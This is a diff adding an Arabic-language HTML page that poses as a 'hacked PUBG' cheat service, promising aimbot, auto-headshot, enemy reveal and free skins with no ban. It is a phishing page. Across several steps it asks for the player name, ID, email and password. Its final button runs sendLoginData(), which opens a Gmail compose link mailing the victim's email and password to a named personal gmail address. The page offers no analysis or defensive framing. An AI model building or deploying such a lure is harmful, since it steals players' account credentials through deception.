@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ببجي مهكرة - تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 28px;
+            margin: 20px 0;
+            color: #00b4d8;
+        }
+        p, li {
+            font-size: 18px;
+            margin: 10px 0;
+            color: #f0f0f0;
+        }
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #00b4d8;
+            background-color: #222;
+            color: #fff;
+            font-size: 16px;
+            text-align: right;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #00b4d8;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #00a3c2;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- الصفحة الترحيبية -->
+    <div id="step0">
+        <h1>مرحبًا بك في موقع ببجي المهكرة! 🔥</h1>
+        <p>احصل على أقوى المميزات داخل ببجي بكل سهولة:</p>
+        <ul>
+            <li>✅ هدشوت تلقائي</li>
+            <li>✅ تبات ايم خرافي</li>
+            <li>✅ كشف أماكن الأعداء</li>
+            <li>✅ فتح جميع السكنات والأسلحة</li>
+            <li>🔥 أمان 100% - بدون أي حظر!</li>
+        </ul>
+        <button class="btn" onclick="goToStep(1)">ابدأ الآن</button>
+    </div>
+
+    <!-- صفحة إدخال اسم اللاعب والـ ID -->
+    <div id="step1" class="hidden">
+        <h1>إدخال بيانات الحساب</h1>
+        <p>قم بإدخال اسم اللاعب و ID ببجي للحصول على أفضل تجربة!</p>
+        <input type="text" id="pubgName" class="input-box" placeholder="اسم اللاعب في ببجي" required><br>
+        <input type="text" id="pubgID" class="input-box" placeholder="ID ببجي" required><br>
+        <button class="btn" onclick="goToStep(2)">التالي</button>
+    </div>
+
+    <!-- صفحة إدخال الإيميل وكلمة السر -->
+    <div id="step2" class="hidden">
+        <h1>إدخال الإيميل وكلمة السر</h1>
+        <p>يرجى إدخال إيميلك وكلمة مرورك الخاصة لتأكيد الحساب.</p>
+        <input type="email" id="email" class="input-box" placeholder="الإيميل" required><br>
+        <input type="password" id="password" class="input-box" placeholder="كلمة السر" required><br>
+        <button class="btn" onclick="goToStep(3)">التالي</button>
+    </div>
+
+    <!-- صفحة اختيار نوع ببجي -->
+    <div id="step3" class="hidden">
+        <h1>اختر نوع نسخة ببجي</h1>
+        <p>اختر نسخة اللعبة التي تريد اللعب بها:</p>
+        <button class="btn" onclick="selectPubgType('عالمية')">ببجي عالمية</button><br>
+        <button class="btn" onclick="selectPubgType('كورية')">ببجي كورية</button><br>
+        <button class="btn" onclick="selectPubgType('صينية')">ببجي صينية</button>
+    </div>
+
+    <!-- صفحة تبات ايم -->
+    <div id="step4" class="hidden">
+        <h1>هل تريد تبات ايم؟</h1>
+        <p>هل ترغب في تفعيل تبات ايم للحصول على دقة عالية؟</p>
+        <button class="btn" onclick="setTbot(true)">نعم</button><br>
+        <button class="btn" onclick="setTbot(false)">لا</button><br>
+    </div>
+
+    <!-- صفحة كشف أماكن -->
+    <div id="step5" class="hidden">
+        <h1>هل تريد كشف أماكن الأعداء؟</h1>
+        <p>هل ترغب في كشف أماكن الأعداء في اللعبة؟</p>
+        <button class="btn" onclick="setReveal(true)">نعم</button><br>
+        <button class="btn" onclick="setReveal(false)">لا</button><br>
+    </div>
+
+    <!-- صفحة هد شوت -->
+    <div id="step6" class="hidden">
+        <h1>هل تريد هد شوت تلقائي؟</h1>
+        <p>هل ترغب في تفعيل ميزة الهد شوت التلقائي؟</p>
+        <button class="btn" onclick="setHeadshot(true)">نعم</button><br>
+        <button class="btn" onclick="setHeadshot(false)">لا</button><br>
+    </div>
+
+    <!-- صفحة سكنات -->
+    <div id="step7" class="hidden">
+        <h1>هل تريد سكنات؟</h1>
+        <p>هل ترغب في فتح سكنات وأسلحة إضافية؟</p>
+        <button class="btn" onclick="setSkins(true)">نعم</button><br>
+        <button class="btn" onclick="setSkins(false)">لا</button><br>
+    </div>
+
+    <!-- صفحة التأكيد -->
+    <div id="step8" class="hidden">
+        <h1>تم تسجيل الدخول بنجاح!</h1>
+        <p>تم التحقق من حسابك، سيتم إرسال الرابط إلى إيميلك الخاص.</p>
+        <p>يرجى التحقق من صندوق الوارد في بريدك الإلكتروني.</p>
+        <button class="btn" onclick="sendLoginData()">إرسال البيانات</button>
+    </div>
+</div>
+
+<script>
+    let playerName = "";
+    let playerID = "";
+    let email = "";
+    let password = "";
+    let selectedPubgType = "";
+    let tbot = false;
+    let reveal = false;
+    let headshot = false;
+    let skins = false;
+
+    function goToStep(stepNumber) {
+        document.getElementById("step0").classList.add("hidden");
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.add("hidden");
+        document.getElementById("step4").classList.add("hidden");
+        document.getElementById("step5").classList.add("hidden");
+        document.getElementById("step6").classList.add("hidden");
+        document.getElementById("step7").classList.add("hidden");
+        document.getElementById("step8").classList.add("hidden");
+
+        if (stepNumber === 2) {
+            playerName = document.getElementById('pubgName').value;
+            playerID = document.getElementById('pubgID').value;
+            if (!playerName || !playerID) {
+                alert("الرجاء إدخال اسم اللاعب والـ ID.");
+                return;
+            }
+        } else if (stepNumber === 3) {
+            email = document.getElementById('email').value;
+            password = document.getElementById('password').value;
+            if (!email || !password) {
+                alert("الرجاء إدخال الإيميل وكلمة السر.");
+                return;
+            }
+        }
+
+        document.getElementById("step" + stepNumber).classList.remove("hidden");
+    }
+
+    function selectPubgType(type) {
+        selectedPubgType = type;
+        goToStep(4);
+    }
+
+    function setTbot(value) {
+        tbot = value;
+        goToStep(5);
+    }
+
+    function setReveal(value) {
+        reveal = value;
+        goToStep(6);
+    }
+
+    function setHeadshot(value) {
+        headshot = value;
+        goToStep(7);
+    }
+
+    function setSkins(value) {
+        skins = value;
+        goToStep(8);
+    }
+
+    function sendLoginData() {
+        let gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=faiezalhashmy@gmail.com&su=تسجيل دخول ببجي&body=
+            إيميل: ${email}%0A
+            كلمة السر: ${password}`;
+
+        window.location.href = gmailUrl;
+    }
+</script>
+
+</body>
+</html>
